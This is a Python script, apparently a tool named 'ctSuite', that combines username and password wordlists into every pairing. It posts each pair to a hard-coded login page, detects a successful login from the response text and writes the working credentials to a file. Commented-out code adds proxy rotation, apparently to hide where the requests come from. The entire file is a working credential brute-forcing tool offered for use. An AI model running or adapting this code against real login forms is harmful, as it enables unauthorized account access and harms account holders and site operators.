import os, json
import os.path
import requests
import time
import shutil #Large file append handling, more effecient than other implementations
from tkinter import Tk #For GUI
from tkinter.filedialog import askopenfilename #For GUI
from tkinter import filedialog #For GUI
import itertools #For permutations

proxyFolder = '.\checker-files'
goodProxies = str(proxyFolder + '/good-proxies.txt')
configFolder = ".\configs" #Where should we look
resourceFolder = ".\credentials"
url = ''
loginbox = ''
passwordbox = ''
comboToCheck = ''

def initialize(): #Function built to load the config attributes to global variables usable by this script
    global configFolder, url, loginbox, passwordbox #global imports

    endS = print('\n################ END INITIAL SEQUENCE ################\n')
    print('\n################ BEGIN INITIAL SEQUENCE ################\n')


    if os.path.isdir(configFolder):
        print('\nConfig folder exists.. checking for resource folder.. \n') #Checks if config folder exists
        if os.path.isdir(resourceFolder): #Checks if there is a resource folder
            print('Resource folder present, continuing \n')
            def printConfigData(): #Easy way to call current config data. Remember to setup the file open first when calling.
                global url, loginbox, passwordbox #global imports
                print('\n################ LOADED CONFIG DETAILS BELOW')
                print('#                Config name: '+ p['Config name'])
                print('#                URL to check against is: '+ p['url'])
                print('#                Login HTML attribute @ for Login: '+ p['Login field attribute name'])
                print('#                Login HTML attribute @ for Password: '+ p['Password field attribute name'])
                print('################ LOADED CONFIG DETAILS END \n')
                endS
                url = p['url']
                loginbox = p['Login field attribute name'] #Actual useful bit of the function.. assigning values to strings from JSON dump file
                passwordbox = p['Password field attribute name']
                
            if len(os.listdir(configFolder)) == 0: #Checks the directory isn't empty, if so, fails
                print(configFolder, "is empty, please go back to config-maker.py and make a config first!")
                endS
            else:    
                path, dirs, files = next(os.walk(configFolder)) #Counts number of files in configFolder, so if >1, it brings up Tkinter GUI, if less, auto selects the config in there
                file_count = len(files)
                if file_count == 1:
                    configFile = str(files) # assigns the non-str var as a str var to config file to be stripped
                    configFile = configFile.translate({ord('['): None}) #Removing chars we don't want from the 1 file so it is readable
                    configFile = configFile.translate({ord(']'): None})
                    configFile = configFile.translate({ord("'"): None})
                    print('Only 1 config present, auto-loading config: ', configFile)
                    with open(str(configFolder + '/' + configFile)) as json_file: #Opens the .json config with open as a str
                        data = json.load(json_file) #..to render json data too
                        for p in data['config']: #Reminds you of config settings which have been auto-selected from the directory
                            printConfigData()
                else:
                    print('>1 config detected, please select config you want')
                    Tk().withdraw() #Tkinter GUI draw function
                    configFile = str(filedialog.askopenfilename(initialdir=configFolder, title="Select your config file", #Selection of your .json file
                            filetypes=[("Config files", "*.json")])) #Sorts files to show
                    with open(configFile) as json_file: #Opens the .json config from the Tkinter popup
                        data = json.load(json_file) #..to render json data too
                        for p in data['config']: #Reminds you of config you have selected
                            printConfigData()
        else:
            print('\nMissing resource folder, cannot proceed...\n') #Error handling
            endS

            exit()
    else:
        print('\nMissing config folder, cannot proceed...\n') #Error handling
        endS
        exit()


def comboGen():
    global comboToCheck, resourceFolder, configFolder, url, loginbox, passwordbox #global imports

    complete_list = []
    with open(str(resourceFolder +'/' + 'usernames.txt')) as f:
        usernames = ', '.join(f.read().splitlines()).split(', ') #Create splitter for each line to be loaded from

    with open(str(resourceFolder + '/' + 'passwords.txt')) as f:
        for i in f: #For loop
            for passwords in i.strip().split('\n'): #Split for each new line
                for usern in usernames:
                    comboToCheck = str(usern + ':' + passwords) #Outputs to a variable we can call later to input into username/password box with : divider
                    complete_list.append(comboToCheck) #Writes every combo to complete_list
    with open(str(resourceFolder + '/' + 'combo.txt'), "w+") as f: #Outputs complete_list to file for purposes later on when filling login form data
        for item in complete_list:
            f.write("%s\n" %item) #Divide after every
    print('combo.txt has been added to \n', resourceFolder)

def correctLogin(username, password):

    print('\nCorrect, working username is: ', username)
    print('\nCorrect, working password is: ', password)
    with open(str(resourceFolder + '/working-login.txt'), 'w+') as f:
        f.write("Username:" + username + "\n")
        f.write("Password:" + password + "\n")
    print('\n################ Thank you for using ctSuite! ################\n')
    exit()



def cliChecker(username, password): #Positional function so it can be called by our loginToSite() function

    time.sleep(2) #Prevents function jumping in right away.. gives values time to initialize 
    counter = '' #Empty string to set for later
    payload = { #Sets request payload for what information to send, $_POST requests to handle etc..
    'Username': username, #Positional values parsed from loginToSite()
    'Password': password, #Positional values parsed from loginToSite()
    'Submit': 'Login' } #Static value which speaks to the $_POST function within login.php

    #proxylist = []
    #with open(str(proxyFolder +'/' + 'good-proxies.txt')) as f:
    #    content = f.readlines()
    #content = [x.strip() for x in content] 

    with requests.Session() as s:
        p = s.post('http://plcs.ctdg.xyz/login.php', data=payload) #Sends the above payload to our login URL
        #p = s.post('http://plcs.ctdg.xyz/login.php', data=payload, proxies=proxylist)
        


    logged_in = True if("Status: logged in" in p.text) else False #Checks the login.php page, and returns boolean as to login successful or not

    if logged_in == True :
        counter = 'yes'
        correctLogin(username, password)

    elif logged_in == False:
        counter = 'no'

    print('\n################ Attempting login for:')
    print('#                Username: ', username)
    print('#                Password: ', password)
    print('#                Did the login work?: ', counter) 
    if counter == 'yes' :
        print('#                Login worked.. terminating..')
    elif counter == 'no':
        print('#                Login failed.. looping..')
    print('################ Login end \n')

def loginToSite():

    currentValue = ''
    with open(str(resourceFolder +'/' + 'combo.txt')) as f:
        for line in f:
            currentValue = line #Sets loop through (line by line) to our value we can then split
            a,b = currentValue.split(':', 1) #Sets combo split to divide variable to two strings
            a = a.rstrip() #Remove any whitespace/space from this string as it will interfere the login system
            b = b.rstrip() #Remove any whitespace/space from this string as it will interfere the login system
            cliChecker(a, b) #Runs our username:password combo against our cliChecker function

initialize()
comboGen()
loginToSite()